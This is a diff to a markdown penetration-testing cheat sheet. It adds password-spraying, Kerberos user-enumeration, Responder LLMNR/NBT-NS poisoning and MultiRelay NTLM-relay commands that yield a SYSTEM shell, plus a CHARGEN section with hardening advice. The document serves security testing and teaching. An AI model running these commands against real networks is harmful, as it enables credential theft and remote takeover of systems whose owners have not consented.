@@ -736,9 +736,6 @@ enum4linux -a IP                                 # Perform all simple enumeratio
 /opt/impacket/examples/lookupsid.py USER:PASSWORD@victim.com # Enumerate both local and domain users.
 
 /opt/impacket/examples/reg.py ignite/Administrator:Ignite@987@192.168.1.105 query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s
-
-# Password spraying
-spray.sh -smb IP USERS.txt PASSWORDS.txt AttemptsPerLockoutPeriod LockoutPeriodInMinutes DOMAIN
 ```
 
 You can try connect to a share by doing the following:
@@ -769,6 +766,18 @@ sudo mount -t cifs -r 'user=USERNAME,password=PASSWORD //IP//SHARE /mnt/data
 
 For more information about that technique refer to [T1021.002 - Remote Services: SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002/)
 
+#### Brute-Forcing
+
+
+- [Spray](https://github.com/Greenwolf/Spray) is a password spraying tool for Active Directory credentials.
+
+
+```bash
+# Password spraying
+spray.sh -smb IP USERS.txt PASSWORDS.txt AttemptsPerLockoutPeriod LockoutPeriodInMinutes DOMAIN
+```
+
+
 ###### *If you don't know, now you know: (Windows Shares)[]*
 
 - **DriveLetter\$**: This is a shared root partition or volume. Shared root partitions and volumes are displayed as the drive letter name appended with the dollar sign (\$). For example, when drive letters C and D are shared, they are displayed as C\$ and D\$.
@@ -792,6 +801,9 @@ kerbrute usernum -d DOMAIN USERTXT # Enumerate valid domain usernames via Kerber
 # Make sure to test for unvalid username
 cme smb IP --pass-pol # Get the password policy
 ```
+
+nmap -p88 --script krb5-enum-users --script-args krb5-enumusers.realm="cyberspacekittens.local",userdb=/opt/userlist.txt <Domain Controller IP>
+
 
 By default, failures are not logged, but that can be changed with -v.
 Kerbrute has a **--safe** option.
@@ -836,7 +848,8 @@ ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authty
 ### LLMNR/NBT-NS Spoofing Attack
 
 By responding to LLMNR/NBT-NS network traffic, we can spoof an authoritative source for name resolution to force communication with an out controlled system. We can then collect or relay authentication materials.
-Both those protocols uses NTLM and NTMLv2 hashes.
+This mostly occurs when there are old mounted drives or applications that have hardcoded servers, and many times, just misconfigurations.
+Both those LLMNR and NBT-NS uses NTLM and NTMLv2 hashes.
 
 Here below is an example of the attack.
 
@@ -847,6 +860,11 @@ Source: <https://itrtech.africa/blog/the-llmnr-nbt-ns-strike/>
 [Responder](https://github.com/lgandx/Responder) is an LLMNR, NBT-NS and MDNS poisoner. It will answer to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix
 
 ```bash
+# Listen for hashes
+python Responder.py -I ETHERNER_INTERFACE -wrf
+# Force a basic authentication pop-up instead of requiring the use of NetNTLMv2 credentials by using the F (ForceWpadAuth) and b (basic authentication).
+python Responder.py -I eth0 -wfFbv
+
 python Responder.py -I ETHERNER_INTERFACE -rdfwv # Built-in an HTTP Auth server, MSSQL Auth server, LDAP Auth server and WPAD Proxy Server
 ```
 
@@ -857,6 +875,27 @@ Options:
 - **-w**: Start the WPAD rogue proxy server.
 - **-v**: Increase verbosity.
 - **-f**: This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.
+
+We can also use MultiRelay, which is a powerful pentest utility included in Responder's tools folder, giving you the ability to perform targeted NTLMv1 and NTLMv2 relay on a selected target. That relayed NTLMv1 or NTLMv2 hash will need to have access into that other machine
+
+Once a relay has been successful, MultiRelay will give you an interactive shell allowing you to:
+
+- Remotely dump the LM and NT hashes on the target.
+- Remotely dump any registry keys under HKLM.
+- Read any file on the target.
+- Download any file on the target.
+- Execute any command as System on the target.
+
+```bash
+# 1. Edit the Responder config file to disable SMB and HTTP servers
+gedit Responder.conf # -> Change SMB and HTTP to Off
+# 2. 
+python Responder.py -I ETHERNER_INTERFACE -rv
+# 3. 
+/MultiRelay.py -t <target host> -c <shell command> -u ALL
+```
+
+https://threat.tevora.com/quick-tip-skip-cracking-responder-hashes-and-replay-them/
 
 For more information about that technique refer to [T1557.001 - Man-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/)
 
@@ -959,10 +998,27 @@ rlogin -l USERNAME <target>  # Connect on a remote machine with a
 nmap -p 631 --script cups-info IP # Lists printers managed by the CUPS printing service.
 ```
 
+### CHARGEN
+
+The Character Generator Protocol (CHARGEN) is a service intended for testing, debugging, and measurement purposes. The protocol is rarely used, as its design flaws allow ready misuse
+
+UDP CHARGEN is commonly used in denial-of-service attacks.
+
+```bash
+telnet HOST chargen
+```
+
+*Note that CHARGEN may be seen in connected devices such as printers*
+
+:white_check_mark: How to protect against or detect that technique:
+
+- *Architecture*: Ensure CHARGEN services are not enabled within your organization if not used. If used, it it recommended to highly harden the firewall rules for the CHARGEN flows.
+
 ### Network Ports
 
 |Port(s)|Protocol(s)|Services|
 |-|---------- | ----------- |
+|19|TCP & UDP|CHARGEN|
 |21|TCP|FTP|
 |25|TCP|SMTP|
 |53|TCP/UDP|DNS|
